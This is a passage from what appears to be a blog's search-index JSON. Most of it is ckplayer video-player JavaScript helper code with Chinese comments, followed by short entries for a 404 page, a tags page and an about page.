(start.substring(start.length - 1, start.length) == '%') { b = parseInt(obj['start']); } else { b = parseInt(obj['start'] * 100); } } if (obj['end'] == null) { c = pm['alpha'] * 100 - b; } else { if (end.substring(end.length - 1, end.length) == '%') { c = parseInt(end) - b; } else if (end.substring(0, 1) == '-' || end.substring(0, 1) == '+') { if (typeof(obj['end']) == 'number') { c = parseInt(obj['end']) * 100 - b; } else { c = parseInt(obj['end']) * 100; } } else { c = parseInt(obj['end']) * 100 - b; } } break; } var callBack = function() { var index = thisTemp.arrIndexOf(thisTemp.animateElementArray, animateId); if (index > -1) { thisTemp.animateArray.splice(index, 1); thisTemp.animateElementArray.splice(index, 1); } index = thisTemp.arrIndexOf(thisTemp.animatePauseArray, animateId); if (index > -1) { thisTemp.animatePauseArray.splice(index, 1); } if (obj['callBack'] != null && obj['element'] && obj['callBack'] != 'callBack' && obj['callBack'] != 'tweenX' && obj['tweenY'] != 'callBack' && obj['callBack'] != 'tweenAlpha') { var cb = eval(obj['callBack']); cb(obj['element']); obj['callBack'] = null; } }; var stopTween = function() { if (timerTween != null) { if (timerTween.runing) { timerTween.stop(); } timerTween = null; } }; var tweenX = function() { if (t < d) { t += 10; css = { left: Math.ceil(tweenFun(t, b, c, d)) + 'px' }; if (obj['static']) { eleCoor = thisTemp.calculationCoor(obj['element']); css['top'] = eleCoor['y'] + 'px'; } thisTemp.css(obj['element'], css); } else { stopTween(); try { var defX = this.arrIndexOf(this.elementTempArr, obj['element'].className); if (defX > -1) { this.elementTempArr.splice(defX, 1); } } catch(event) {} thisTemp.elementArr.push(obj['element'].className); callBack(); } }; var tweenY = function() { if (t < d) { t += 10; css = { top: Math.ceil(tweenFun(t, b, c, d)) + 'px' }; if (obj['static']) { eleCoor = thisTemp.calculationCoor(obj['element']); css['left'] = eleCoor['x'] + 'px'; } thisTemp.css(obj['element'], css); } else { stopTween(); try { var defY = this.arrIndexOf(this.elementTempArr, obj['element'].className); if (defY > -1) { this.elementTempArr.splice(defY, 1); } } catch(event) {} thisTemp.elementArr.push(obj['element'].className); callBack(); } }; var tweenAlpha = function() { if (t < d) { t += 10; eleCoor = thisTemp.calculationCoor(obj['element']); var ap = Math.ceil(tweenFun(t, b, c, d)) * 0.01; css = { filter: 'alpha(opacity:' + ap + ')', opacity: ap.toString() }; if (obj['static']) { eleCoor = thisTemp.calculationCoor(obj['element']); css['top'] = eleCoor['y'] + 'px'; css['left'] = eleCoor['x'] + 'px'; } thisTemp.css(obj['element'], css); } else { stopTween(); try { var defA = this.arrIndexOf(this.elementTempArr, obj['element'].className); if (defA > -1) { this.elementTempArr.splice(defA, 1); } } catch(event) {} thisTemp.elementArr.push(obj['element'].className); callBack(); } }; switch (obj['parameter']) { case 'x': tweenObj = tweenX; break; case 'y': tweenObj = tweenY; break; case 'alpha': tweenObj = tweenAlpha; break; default: break; } timerTween = new thisTemp.timer(10, tweenObj); timerTween.callBackFunction = callBack; if (obj['overStop']) { var mouseOver = function() { if (timerTween != null && timerTween.runing) { timerTween.stop(); } }; this.addListenerInside('mouseover', mouseOver, obj['element']); var mouseOut = function() { var start = true; if (obj['pauseStop'] && thisTemp.getMetaDate()['paused']) { start = false; } if (timerTween != null && !timerTween.runing && start) { timerTween.start(); } }; this.addListenerInside('mouseout', mouseOut, obj['element']); } this.animateArray.push(timerTween); this.animateElementArray.push(animateId); if (obj['pauseStop']) { this.animatePauseArray.push(animateId); } return animateId; }, /* 接口函数函数 继续运行animate */ animateResume: function(id) { if (this.playerType == 'flashplayer') { this.V.animateResume(this.isUndefined(id) ? '': id); return; } var arr = []; if (id != '' && !this.isUndefined(id) && id != 'pause') { arr.push(id); } else { if (id === 'pause') { arr = this.animatePauseArray; } else { arr = this.animateElementArray; } } for (var i = 0; i < arr.length; i++) { var index = this.arrIndexOf(this.animateElementArray, arr[i]); if (index > -1) { this.animateArray[index].start(); } } }, /* 接口函数 暂停运行animate */ animatePause: function(id) { if (this.playerType == 'flashplayer') { this.V.animatePause(this.isUndefined(id) ? '': id); return; } var arr = []; if (id != '' && !this.isUndefined(id) && id != 'pause') { arr.push(id); } else { if (id === 'pause') { arr = this.animatePauseArray; } else { arr = this.animateElementArray; } } for (var i = 0; i < arr.length; i++) { var index = this.arrIndexOf(this.animateElementArray, arr[i]); if (index > -1) { this.animateArray[index].stop(); } } }, /* 内置函数 根据ID删除数组里对应的内容 */ deleteAnimate: function(id) { if (this.playerType == 'flashplayer' && this.V) { try { this.V.deleteAnimate(id); } catch(event) { this.log(event); } return; } var index = this.arrIndexOf(this.animateElementArray, id); if (index > -1) { this.animateArray[index].callBackFunction(); this.animateArray.splice(index, 1); this.animateElementArray.splice(index, 1); } }, /* 内置函数 删除外部新建的元件 */ deleteElement: function(ele) { if (this.playerType == 'flashplayer' && this.V) { try { this.V.deleteElement(ele); } catch(event) {} return; } //先将该元件从元件数组里删除，让其不再跟随播放器的尺寸改变而改变位置 var def = this.arrIndexOf(this.elementArr, ele.className); if (def > -1) { this.elementArr.splice(def, 1); } try { def = this.arrIndexOf(this.elementTempArr, ele.className); if (def > -1) { this.elementTempArr.splice(def, 1); } } catch(event) {} this.deleteAnimate(ele); this.deleteChild(ele); }, /* -------------------------------------------------------------- 共用函数部分 以下函数并非只能在本程序中使用，也可以在页面其它项目中使用 根据ID获取元素对象 */ getByElement: function(obj, parent) { if (this.isUndefined(parent)) { parent = document; } var num = obj.substr(0, 1); var res = []; if (num != '#') { if (num == '.') { obj = obj.substr(1, obj.length); } if (parent.getElementsByClassName) { res = parent.getElementsByClassName(obj); } else { var reg = new RegExp(' ' + obj + ' ', 'i'); var ele = parent.getElementsByTagName('*'); for (var i = 0; i < ele.length; i++) { if (reg.test(' ' + ele[i].className + ' ')) { res.push(ele[i]); } } } if (res.length > 0) { return res[0]; } else { return res; } } else { if (num == '#') { obj = obj.substr(1, obj.length); } return document.getElementById(obj); } }, /* 共用函数 功能：修改样式或获取指定样式的值， elem：ID对象或ID对应的字符，如果多个对象一起设置，则可以使用数组 attribute：样式名称或对象，如果是对象，则省略掉value值 value：attribute为样式名称时，定义的样式值 示例一： this.css(ID,'width','100px'); 示例二： this.css('id','width','100px'); 示例三： this.css([ID1,ID2,ID3],'width','100px'); 示例四： this.css(ID,{ width:'100px', height:'100px' }); 示例五(获取宽度)： var width=this.css(ID,'width'); */ css: function(elem, attribute, value) { var i = 0; var k = ''; if (typeof(elem) == 'object') { //对象或数组 if (!this.isUndefined(typeof(elem.length))) { //说明是数组 for (i = 0; i < elem.length; i++) { var el; if (typeof(elem[i]) == 'string') { el = this.getByElement(elem[i]) } else { el = elem[i]; } if (typeof(attribute) != 'object') { if (!this.isUndefined(value)) { el.style[attribute] = value; } } else { for (k in attribute) { if (!this.isUndefined(attribute[k])) { try { el.style[k] = attribute[k]; } catch(event) { this.log(event); } } } } } return; } } if (typeof(elem) == 'string') { elem = this.getByElement(elem); } if (typeof(attribute) != 'object') { if (!this.isUndefined(value)) { elem.style[attribute] = value; } else { if (!this.isUndefined(this.getStyle(elem, attribute))) { return this.getStyle(elem, attribute); } else { return false; } } } else { for (k in attribute) { if (!this.isUndefined(attribute[k])) { elem.style[k] = attribute[k]; } } } }, /* 内置函数 兼容型获取style */ getStyle: function(obj, attr) { if (!this.isUndefined(obj.style[attr])) { return obj.style[attr]; } else { if (obj.currentStyle) { return obj.currentStyle[attr]; } else { return getComputedStyle(obj, false)[attr]; } } }, /* 共用函数 判断变量是否存在或值是否为undefined */ isUndefined: function(value) { try { if (value == 'undefined' || value == undefined || value == null) { return true; } } catch(event) { this.log(event); } return false; }, /* 共用函数 外部监听函数 */ addListener: function(name, funName) { if (name && funName) { if (this.playerType == 'flashplayer') { var ff = ''; //定义用来向flashplayer传递的函数字符 if (typeof(funName) == 'function') { ff = this.getParameterNames(funName); } this.V.addListener(name, ff); return; } var have = false; for (var i = 0; i < this.listenerJsArr.length; i++) { var arr = this.listenerJsArr[i]; if (arr[0] == name && arr[1] == funName) { have = true; break; } } if (!have) { this.listenerJsArr.push([name, funName]); } } }, /* 共用函数 外部删除监听函数 */ removeListener: function(name, funName) { if (name && funName) { if (this.playerType == 'flashplayer') { var ff = ''; //定义用来向flashplayer传递的函数字符 if (typeof(funName) == 'function') { ff = this.getParameterNames(funName); } this.V.removeListener(name, ff); return; } for (var i = 0; i < this.listenerJsArr.length; i++) { var arr = this.listenerJsArr[i]; if (arr[0] == name && arr[1] == funName) { this.listenerJsArr.splice(i, 1); break; } } } }, /* 内部监听函数，调用方式： this.addListenerInside('click',function(event){},[ID]); d值为空时，则表示监听当前的视频播放器 */ addListenerInside: function(e, f, d, t) { if (this.isUndefined(t)) { t = false; } var o = this.V; if (!this.isUndefined(d)) { o = d; } if (o.addEventListener) { try { o.addEventListener(e, f, t); } catch(event) {} } else if (o.attachEvent) { try { o.attachEvent('on' + e, f); } catch(event) {} } else { o['on' + e] = f; } }, /* 删除内部监听函数，调用方式： this.removeListenerInside('click',function(event){}[,ID]); d值为空时，则表示监听当前的视频播放器 */ removeListenerInside: function(e, f, d, t) { /*if(this.playerType=='flashplayer' && this.getParameterNames(f) && this.isUndefined(d)) { return; }*/ if (this.isUndefined(t)) { t = false; } var o = this.V; if (!this.isUndefined(d)) { o = d; } if (o.removeEventListener) { try { this.addNum--; o.removeEventListener(e, f, t); } catch(e) {} } else if (o.detachEvent) { try { o.detachEvent('on' + e, f); } catch(e) {} } else { o['on' + e] = null; } }, /* 共用函数 统一分配监听，以达到跟as3同样效果 */ sendJS: function(name, val) { if (this.adPlayerPlay && name.substr( - 2) != 'Ad') { return; } var list = this.listenerJsArr; var obj = { variable: this.vars['variable'] }; if (this.vars['playerID']) { obj['playerID'] = this.vars['playerID']; } if(this.vars['debug']){ this.log(name+':'+val); } for (var i = 0; i < list.length; i++) { var arr = list[i]; if (arr[0] == name) { if (val) { switch (arr[1].length) { case 1: arr[1](val); break; case 2: arr[1](val, obj); break; default: arr[1](); break; } } else { switch (arr[1].length) { case 1: if (typeof(val) == 'boolean') { arr[1](false); } else { arr[1](obj); } break; default: arr[1](); break; } } } } }, /* 共用函数 获取函数名称，如 function ckplayer(){} var fun=ckplayer，则getParameterNames(fun)=ckplayer */ getParameterNames: function(fn) { if (typeof(fn) !== 'function') { return false; } var COMMENTS = /((\\/\\/.*$)|(\\/\\*[\\s\\S]*?\\*\\/))/mg; var code = fn.toString().replace(COMMENTS, ''); var result = code.slice(code.indexOf(' ') + 1, code.indexOf('(')); return result === null ? false: result; }, /* 共用函数 获取当前本地时间 */ getNowDate: function() { var nowDate = new Date(); var month = nowDate.getMonth() + 1; var date = nowDate.getDate(); var hours = nowDate.getHours(); var minutes = nowDate.getMinutes(); var seconds = nowDate.getSeconds(); var tMonth = '', tDate = '', tHours = '', tMinutes = '', tSeconds = '', tSeconds = (seconds < 10) ? '0' + seconds: seconds + '', tMinutes = (minutes < 10) ? '0' + minutes: minutes + '', tHours = (hours < 10) ? '0' + hours: hours + '', tDate = (date < 10) ? '0' + date: date + '', tMonth = (month < 10) ? '0' + month: month + ''; return tMonth + '/' + tDate + ' ' + tHours + ':' + tMinutes + ':' + tSeconds; }, /* 共用函数 格式化时分秒 seconds:Int：秒数 ishours:Boolean：是否显示小时，如果设置成false，则会显示如80:20，表示1小时20分钟20秒 */ formatTime: function(seconds, ishours) { var tSeconds = '', tMinutes = '', tHours = ''; if (isNaN(seconds)) { seconds = 0; } var s = Math.floor(seconds % 60), m = 0, h = 0; if (ishours) { m = Math.floor(seconds / 60) % 60; h = Math.floor(seconds / 3600); } else { m = Math.floor(seconds / 60); } tSeconds = (s < 10) ? '0' + s: s + ''; tMinutes = (m > 0) ? ((m < 10) ? '0' + m + ':': m + ':') : '00:'; tHours = (h > 0) ? ((h < 10) ? '0' + h + ':': h + ':') : ''; if (ishours) { return tHours + tMinutes + tSeconds; } else { return tMinutes + tSeconds; } }, /* 共用函数 获取一个随机字符 len：随机字符长度 */ randomString: function(len) { len = len || 16; var chars = 'abcdefghijklmnopqrstuvwxyz'; var maxPos = chars.length; var val = ''; for (i = 0; i < len; i++) { val += chars.charAt(Math.floor(Math.random() * maxPos)); } return 'ch' + val; }, /* 共用函数 获取字符串长度,中文算两,英文数字算1 */ getStringLen: function(str) { var len = 0; for (var i = 0; i < str.length; i++) { if (str.charCodeAt(i) > 127 || str.charCodeAt(i) == 94) { len += 2; } else { len++; } } return len; }, /* 内部函数 用来为ajax提供支持 */ createXHR: function() { if (window.XMLHttpRequest) { //IE7+、Firefox、Opera、Chrome 和Safari return new XMLHttpRequest(); } else if (window.ActiveXObject) { //IE6 及以下 try { return new ActiveXObject('Microsoft.XMLHTTP'); } catch(event) { try { return new ActiveXObject('Msxml2.XMLHTTP'); } catch(event) { this.eject(this.errorList[7]); } } } else { this.eject(this.errorList[8]); } }, /* 共用函数 ajax调用 */ ajax: function(cObj) { var thisTemp = this; var callback = null; var obj = { method: 'get', //请求类型 dataType: 'json', //请求的数据类型 charset: 'utf-8', async: false, //true表示异步，false表示同步 url: '', data: null, success: null }; if (typeof(cObj) != 'object') { this.eject(this.errorList[9]); return; } obj = this.standardization(obj, cObj); if (obj.dataType === 'json' || obj.dataType === 'text' || obj.dataType === 'html') { var xhr = this.createXHR(); callback = function() { //判断http的交互是否成功 if (xhr.status == 200) { if (thisTemp.isUndefined(obj.success)) { return; } if (obj.dataType === 'json') { try { obj.success(eval('(' + xhr.responseText + ')')); //回调传递参数 } catch(event) { obj.success(null); } } else { obj.success(xhr.responseText); //回调传递参数 } } else { obj.success(null); thisTemp.eject(thisTemp.errorList[10], 'Ajax.status:' + xhr.status); } }; obj.url = obj.url.indexOf('?') == -1 ? obj.url + '?rand=' + this.randomString(6) : obj.url; obj.data = this.formatParams(obj.data); //通过params()将名值对转换成字符串 if (obj.method === 'get' && !this.isUndefined(obj.data)) { if (obj.data != '') { if (obj.url.indexOf('?') == -1) { obj.url += '?' + obj.data } else { obj.url += '&' + obj.data; } } } if (obj.async === true) { //true表示异步，false表示同步 xhr.onreadystatechange = function() { if (xhr.readyState == 4 && callback != null) { //判断对象的状态是否交互完成 callback(); //回调 } }; } xhr.open(obj.method, obj.url, obj.async); if (obj.method === 'post') { try{ xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.setRequestHeader('charset', obj['charset']); xhr.send(obj.data); } catch(event){callback();} } else { try{ xhr.send(null); //get方式则填null } catch(event){callback(); } } if (obj.async === false) { //同步 callback(); } } else if (obj.dataType === 'jsonp') { var oHead = document.getElementsByTagName('head')[0]; var oScript = document.createElement('script'); var callbackName = 'callback' + new Date().getTime(); var params = this.formatParams(obj.data) + '&callback=' + callbackName; //按时间戳拼接字符串 callback = obj.success; //拼接好src oScript.src = obj.url.split('?') + '?' + params; //插入script标签 oHead.insertBefore(oScript, oHead.firstChild); //jsonp的回调函数 window[callbackName] = function(json) { callback(json); oHead.removeChild(oScript); }; } }, /* 内置函数 动态加载js */ loadJs: function(path, success) { var oHead = document.getElementsByTagName('HEAD').item(0); var oScript = document.createElement('script'); oScript.type = 'text/javascript'; oScript.src = this.getNewUrl(path); oHead.appendChild(oScript); oScript.onload = function() { success(); } }, /* 共用函数 排除IE6-9 */ isMsie: function() { var browser = navigator.appName; var b_version = navigator.appVersion; var version = b_version.split(';'); var trim_Version = ''; if (version.length > 1) { trim_Version = version[1].replace(/[ ]/g, ''); } if (browser == 'Microsoft Internet Explorer' && (trim_Version == 'MSIE6.0' || trim_Version == 'MSIE7.0' || trim_Version == 'MSIE8.0' || trim_Version == 'MSIE9.0' || trim_Version == 'MSIE10.0')) { return false; } return true; }, /* 共用函数 判断是否安装了flashplayer */ uploadFlash: function() { var swf; if (navigator.userAgent.indexOf('MSIE') > 0) { try { var swf = new ActiveXObject('ShockwaveFlash.ShockwaveFlash'); return true; } catch(e) { return false; } } if (navigator.userAgent.indexOf('Firefox') > 0) { swf = navigator.plugins['Shockwave Flash']; if (swf) { return true } else { return false; } } return true; }, /* 共用函数 检测浏览器是否支持HTML5-Video */ supportVideo: function() { if (!this.isMsie()) { return false; } if ( !! document.createElement('video').canPlayType) { var vidTest = document.createElement('video'); var oggTest; try { oggTest = vidTest.canPlayType('video/ogg; codecs=\"theora, vorbis\"'); } catch(error) { oggTest = false; } if (!oggTest) { var h264Test; try { h264Test = vidTest.canPlayType('video/mp4; codecs=\"avc1.42E01E, mp4a.40.2\"'); } catch(error) { h264Test = false; } if (!h264Test) { return false; } else { if (h264Test == \"probably\") { return true; } else { return false; } } } else { if (oggTest == \"probably\") { return true; } else { return false; } } } else { return false; } }, /* 共用函数 获取属性值 */ getDataset: function(ele, z) { try { return ele.dataset[z]; } catch(error) { try { return ele.getAttribute('data-' + z) } catch(error) { return false; } } }, /* 共用函数 返回flashplayer的对象 */ getObjectById: function(id) { var x = null; var y = this.getByElement('#' + id); var r = 'embed'; if (y && y.nodeName == 'OBJECT') { if (typeof(y.SetVariable) != 'undefined') { x = y; } else { var z = y.getElementsByTagName(r)[0]; if (z) { x = z; } } } return x; }, /* 共用函数 对象转地址字符串 */ formatParams: function(data) { var arr = []; for (var i in data) { arr.push(encodeURIComponent(i) + '=' + encodeURIComponent(data[i])); } return arr.join('&'); }, /* 内置函数 对地址进行冒泡排序 */ arrSort: function(arr) { var temp = []; for (var i = 0; i < arr.length; i++) { for (var j = 0; j < arr.length - i; j++) { if (!this.isUndefined(arr[j + 1]) && arr[j][3] < arr[j + 1][3]) { temp = arr[j + 1]; arr[j + 1] = arr[j]; arr[j] = temp; } } } return arr; }, /* 内置函数 判断文件后缀 */ getFileExt: function(filepath) { if (filepath != '' && !this.isUndefined(filepath)) { if (filepath.indexOf('?') > -1) { filepath = filepath.split('?')[0]; } var pos = '.' + filepath.replace(/.+\\./, ''); return pos.toLowerCase(); } return ''; }, /* 内置函数 判断是否是移动端 */ isMobile: function() { if (navigator.userAgent.match(/(iPhone|iPad|iPod|Android|ios)/i)) { return true; } return false; }, /* 内置函数 搜索字符串str是否包含key */ isContains: function(str, key) { return str.indexOf(key) > -1; }, /* 内置函数 给地址添加随机数 */ getNewUrl: function(url) { if (this.isContains(url, '?')) { return url += '&' + this.randomString(8) + '=' + this.randomString(8); } else { return url += '?' + this.randomString(8) + '=' + this.randomString(8); } }, /* 共用函数 获取clientX和clientY */ client: function(event) { var eve = event || window.event; if (this.isUndefined(eve)) { eve = { clientX: 0, clientY: 0 }; } return { x: eve.clientX + (document.documentElement.scrollLeft || this.body.scrollLeft) - this.pdCoor['x'], y: eve.clientY + (document.documentElement.scrollTop || this.body.scrollTop) - this.pdCoor['y'] } }, /* 内置函数 获取节点的绝对坐标 */ getCoor: function(obj) { var coor = this.getXY(obj); return { x: coor['x'] - this.pdCoor['x'], y: coor['y'] - this.pdCoor['y'] }; }, getXY: function(obj) { var parObj = obj; var left = obj.offsetLeft; var top = obj.offsetTop; while (parObj = parObj.offsetParent) { left += parObj.offsetLeft; top += parObj.offsetTop; } return { x: left, y: top }; }, /* 内置函数 删除本对象的所有属性 */ removeChild: function() { if (this.playerType == 'html5video') { //删除计时器 var i = 0; var timerArr = [this.timerError, this.timerFull, this.timerTime, this.timerBuffer, this.timerClick, this.timerLoading, this.timerCBar, this.timerVCanvas]; for (i = 0; i < timerArr.length; i++) { if (timerArr[i] != null) { if (timerArr[i].runing) { timerArr[i].stop(); } timerArr[i] = null; } } //删除事件监听 var ltArr = this.listenerJsArr; for (i = 0; i < ltArr.length; i++) { this.removeListener(ltArr[i][0], ltArr[i][1]); } } this.playerType == ''; this.V = null; if (this.showFace) { this.deleteChild(this.CB['menu']); } this.deleteChild(this.PD); this.CD.innerHTML = ''; }, /* 内置函数 画封闭的图形 */ canvasFill: function(name, path) { name.beginPath(); for (var i = 0; i < path.length; i++) { var d = path[i]; if (i > 0) { name.lineTo(d[0], d[1]); } else { name.moveTo(d[0], d[1]); } } name.closePath(); name.fill(); }, /* 内置函数 画矩形 */ canvasFillRect: function(name, path) { for (var i = 0; i < path.length; i++) { var d = path[i]; name.fillRect(d[0], d[1], d[2], d[3]); } }, /* 共用函数 删除容器节点 */ deleteChild: function(f) { var def = this.arrIndexOf(this.elementArr, f.className); if (def > -1) { this.elementArr.splice(def, 1); } var childs = f.childNodes; for (var i = childs.length - 1; i >= 0; i--) { f.removeChild(childs[i]); } if (f && f != null && f.parentNode) { try { if (f.parentNode) { f.parentNode.removeChild(f); } } catch(event) {} } }, /* 内置函数 根据容器的宽高,内部节点的宽高计算出内部节点的宽高及坐标 */ getProportionCoor: function(stageW, stageH, vw, vh) { var w = 0, h = 0, x = 0, y = 0; if (stageW / stageH < vw / vh) { w = stageW; h = w * vh / vw; } else { h = stageH; w = h * vw / vh; } x = (stageW - w) * 0.5; y = (stageH - h) * 0.5; return { width: parseInt(w), height: parseInt(h), x: parseInt(x), y: parseInt(y) }; }, /* 共用函数 将字幕文件内容转换成数组 */ parseSrtSubtitles: function(srt) { var subtitlesArr = []; var textSubtitles = []; var i = 0; var arrs = srt.split('\\n'); var arr = []; var delHtmlTag = function(str) { return str.replace(/]+>/g, ''); //去掉所有的html标记 }; for (i = 0; i < arrs.length; i++) { if (arrs[i].replace(/\\s/g, '').length > 0) { arr.push(arrs[i]); } else { if (arr.length > 0) { textSubtitles.push(arr); } arr = []; } } for (i = 0; i < textSubtitles.length; ++i) { var textSubtitle = textSubtitles[i]; if (textSubtitle.length >= 2) { var sn = textSubtitle[0]; // 字幕的序号 var startTime = this.toSeconds(this.trim(textSubtitle[1].split(' --> ')[0])); // 字幕的开始时间 var endTime = this.toSeconds(this.trim(textSubtitle[1].split(' --> ')[1])); // 字幕的结束时间 var content = [delHtmlTag(textSubtitle[2])]; // 字幕的内容 var cktrackdelay=this.vars['cktrackdelay']; if(cktrackdelay!=0){ startTime+=cktrackdelay; endTime+=cktrackdelay; } // 字幕可能有多行 if (textSubtitle.length > 2) { for (var j = 3; j < textSubtitle.length; j++) { content.push(delHtmlTag(textSubtitle[j])); } } // 字幕对象 var subtitle = { sn: sn, startTime: startTime, endTime: endTime, content: content }; subtitlesArr.push(subtitle); } } return subtitlesArr; }, /* 共用函数 计时器,该函数模拟as3中的timer原理 time:计时时间,单位:毫秒 fun:接受函数 number:运行次数,不设置则无限运行 */ timer: function(time, fun, number) { var thisTemp = this; this.time = 10; //运行间隔 this.fun = null; //监听函数 this.timeObj = null; //setInterval对象 this.number = 0; //已运行次数 this.numberTotal = null; //总至需要次数 this.runing = false; //当前状态 this.startFun = function() { thisTemp.number++; thisTemp.fun(); if (thisTemp.numberTotal != null && thisTemp.number >= thisTemp.numberTotal) { thisTemp.stop(); } }; this.start = function() { if (!thisTemp.runing) { thisTemp.runing = true; thisTemp.timeObj = window.setInterval(thisTemp.startFun, time); } }; this.stop = function() { if (thisTemp.runing) { thisTemp.runing = false; window.clearInterval(thisTemp.timeObj); thisTemp.timeObj = null; } }; if (time) { this.time = time; } if (fun) { this.fun = fun; } if (number) { this.numberTotal = number; } this.start(); }, /* 共用函数 将时分秒转换成秒 */ toSeconds: function(t) { var s = 0.0; if (t) { var p = t.split(':'); for (i = 0; i < p.length; i++) { s = s * 60 + parseFloat(p[i].replace(',', '.')); } } return s; }, /*将字符变成数字形式的数组*/ arrayInt: function(str) { var a = str.split(','); var b = []; for (var i = 0; i < a.length; i++) { if (this.isUndefined(a[i])) { a[i] = 0; } if (a[i].substr( - 1) != '%') { a[i] = parseInt(a[i]); } b.push(a[i]); } return b; }, /* 共用函数 将对象Object标准化 */ standardization: function(o, n) { //n替换进o var h = {}; var k; for (k in o) { h[k] = o[k]; } for (k in n) { var type = typeof(h[k]); switch (type) { case 'number': h[k] = parseFloat(n[k]); break; default: h[k] = n[k]; break; } } return h; }, /* 共用函数 搜索数组 */ arrIndexOf: function(arr, key) { if(!arr || !key){ return false; } var re = new RegExp(key, ['']); return (arr.toString().replace(re, '┢').replace(/[^,┢]/g, '')).indexOf('┢'); }, /* 共用函数 去掉空格 */ trim: function(str) { if (str != '') { return str.replace(/(^\\s*)|(\\s*$)/g, ''); } return ''; }, /* 共用函数 判断对象类型 */ typeString:function typeString(object) { return Object.prototype.toString.call(object).slice(8,-1).toLowerCase(); }, /* 共用函数 输出内容到控制台 */ log: function(val) { try { console.log(val); } catch(e) {} }, /* 共用函数 弹出提示 */ eject: function(er, val) { if (!this.vars['debug']) { return; } var errorVal = er[1]; if (!this.isUndefined(val)) { errorVal = errorVal.replace('[error]', val); } var value = 'error ' + er[0] + ':' + errorVal; try { this.log(value); } catch(e) {} } }; window.ckplayer = ckplayer; })();","tags":""},{"title":"页面找不到了","url":"//404.html","text":".article-header { padding: 0; padding-top: 26px; border-left: none; text-align: center; } .article-header:hover { border-left: none; } .article-title { font-size: 2.1em; } strong a { color: #747474; } .article-meta { display: none; } .share { display: none; } .ds-meta { display: none; } .player { margin-left: -10px; } .sign { text-align: right; font-style: italic; } #page-visit { display: none; } .center { text-align: center; height: 2.5em; font-weight: bold; } .article-entry hr { margin: 0; } .pic { text-align: center; margin: 0; } .pic br { display: none; } #container .article-info-post.article-info { display: none; } #container .article .article-title { padding: 0; } 玩一会小游戏放松一下吧！！ 玩法：点击小圆点，将小猫圈住！","tags":""},{"title":"分类 & 标签","url":"/tags/index.html","text":"","tags":""},{"title":"关于我","url":"/about/index.html","text":"新浪微博: https://m.weibo.cn/u/1787546481GitHub: https://github.com/fupingleeTwitter: https://twitter.com/fupinglee","tags":""}]}